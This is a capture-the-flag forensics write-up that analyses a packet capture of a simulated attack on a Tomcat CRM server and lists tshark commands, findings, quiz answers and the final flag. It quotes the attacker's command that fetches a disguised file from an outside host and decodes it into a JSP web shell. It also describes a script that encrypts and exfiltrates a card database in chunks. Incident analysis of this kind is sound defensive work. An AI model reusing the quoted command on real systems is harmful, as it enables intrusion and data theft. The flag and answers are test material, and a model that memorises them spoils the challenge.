# Intro2Pcap

Status: SOLVED.

Flag: `HCMUS-CTF{vib3_hacking_in_big_2026__and_st1ll_h4rdc0ded_k3ys_iz_w1ld}`

The prefix `HCMUS-CTF{vib3_hacking_in_big_2026_` is recovered from the
exfiltrated `customer_cards.sqlite` (suspicious row `C-6767`, processor_token
field). The suffix `_and_st1ll_h4rdc0ded_k3ys_iz_w1ld}` is awarded by the
`nc chall.blackpinker.com <port>` quiz after answering all 10 questions.

Gotcha: the prefix ends with `_` AND the suffix begins with `_`, so the
concatenated flag has a DOUBLE underscore between `2026` and `and`. Single-
underscore concatenation is rejected by the platform.

## Challenge Info

- Category: forensics
- Points at solve time: 132
- Prompt/hint shown on platform: no descriptive text, only `Spawn Instance`
  and the download `acme_crm_ir_capture.pcap`.
- Instance command observed after spawning:

```text
nc chall.blackpinker.com 20753
```

## Useful Commands

List HTTP requests:

```bash
tshark -r acme_crm_ir_capture.pcap -Y http.request \
  -T fields \
  -e frame.number -e frame.time_relative -e ip.src -e tcp.srcport \
  -e ip.dst -e tcp.dstport -e http.request.method -e http.host \
  -e http.request.uri
```

Export HTTP objects:

```bash
mkdir -p http_objects
tshark -r acme_crm_ir_capture.pcap --export-objects http,http_objects
```

Count scanned ports from the attacker:

```bash
tshark -r acme_crm_ir_capture.pcap \
  -Y 'ip.src==172.28.13.20 && ip.dst==172.28.13.10 && tcp.flags.syn==1 && tcp.flags.ack==0' \
  -T fields -e tcp.dstport | sort -n | uniq | wc -l
```

Extract telemetry chunks:

```bash
tshark -r acme_crm_ir_capture.pcap \
  -Y 'http.request.uri contains "/api/v1/telemetry" && http.file_data && http.file_data != "7175657565640a"' \
  -T fields -e http.request.uri -e http.file_data > telemetry.tsv
```

## Findings

The attacker IP is `172.28.13.20`. The victim CRM/Tomcat host is
`172.28.13.10`.

The attacker scanned 100 TCP ports. Fuzzing was done with `ffuf/2.1.0`.

The C2 host used later in the attack was:

```text
assets-acme-cdn.com:9001
```

The first-stage malicious file downloaded by the victim was:

```text
crm-cache.crt
```

The serialized Java session file `http_objects/absholi7ly.session` contains a
Commons Collections style gadget chain. `strings` and `xxd` show this
`Runtime.exec` command:

```text
bash -c {curl,-fsSL,http://assets-acme-cdn.com:9001/assets/crm-cache.crt,-o,/opt/acme-crm/runtime/.crm-cache.crt};{grep,-v,CERTIFICATE,/opt/acme-crm/runtime/.crm-cache.crt}|{base64,-d}>/usr/local/tomcat/webapps/ROOT/uploads/.crm-cache.jsp
```

That command downloads `crm-cache.crt`, strips PEM certificate marker lines,
base64-decodes the payload, and writes a JSP web shell to:

```text
/usr/local/tomcat/webapps/ROOT/uploads/.crm-cache.jsp
```

After that, the attacker used the web shell at
`/uploads/.crm-cache.jsp?cmd=...` to run commands including `whoami`, `id`,
`pwd`, `find`, `cat /opt/acme-crm/app.properties`, and directory listings.

The attacker then downloaded a second disguised payload:

```text
certsync.crt
```

Decoding it produces `font-cache.py`, a shell/Python script that reads:

```text
/opt/acme-crm/backups/customer_cards.sqlite
```

It encrypts that SQLite file with a SHA-256-derived XOR keystream using:

```text
KEY   = 6a8f4b2291d57c60c5e23897a14be0d7356da8f48a73b01ee3dd14f9092a5c77
NONCE = b7a31dc90e2445a8f0c11729
```

The encrypted database was exfiltrated as 64 telemetry chunks to:

```text
/api/v1/telemetry?type=fontcache&sid=fcache-f83c1e07a5d1&n=<seq>
```

Decrypting those chunks produced `customer_cards.sqlite`, a valid SQLite
database. The suspicious payment row is:

```text
customer_id: C-6767
cardholder: Jason Ho
processor_token: HCMUS-CTF{vib3_hacking_in_big_2026_
processor_profile: legacy-enterprise
```

Directly submitting `HCMUS-CTF{vib3_hacking_in_big_2026_legacy-enterprise}`
and the underscore variant was rejected. The real platform flag is likely
returned only after finishing the spawned quiz.

## Quiz Answers (all 10, in order)

```text
1.  172.28.13.20                                              # threat actor IP
2.  100                                                       # ports scanned
3.  ffuf                                                      # fuzzing tool
4.  assets-acme-cdn.com:9001                                  # C2 domain:port
5.  bash -c {curl,-fsSL,...}>/usr/local/tomcat/.../.crm-cache.jsp   # cmd
6.  crm-cache.crt                                             # first stage file
7.  T1140                                                     # MITRE: plant webshell (Deobfuscate/Decode)
8.  b7a31dc90e2445a8f0c11729                                  # nonce (hex)
9.  T1030                                                     # MITRE: exfiltration (Data Transfer Size Limits, chunking)
10. CVE-2025-24813                                            # Tomcat partial-PUT session deserialization RCE
```

The MITRE answers were not the obvious ones:
- Q7 was `T1140` (Deobfuscate/Decode Files or Information), not `T1505.003`
  (Web Shell). The checker keys off the `grep -v CERTIFICATE | base64 -d` step
  that decodes the JSP shell from the disguised `.crt` file.
- Q9 was `T1030` (Data Transfer Size Limits), keyed off the 64 fixed-size
  telemetry chunks, not `T1041` (over C2 channel) or `T1048`.
- Q10 was `CVE-2025-24813`, the recent Tomcat partial-PUT session
  deserialization RCE that matches the `absholi7ly.session` artifact and the
  Commons Collections gadget chain.

Solver script: `solve_quiz.py` (reconnects each attempt, sends the known
prefix, then probes a candidate for the next unknown).
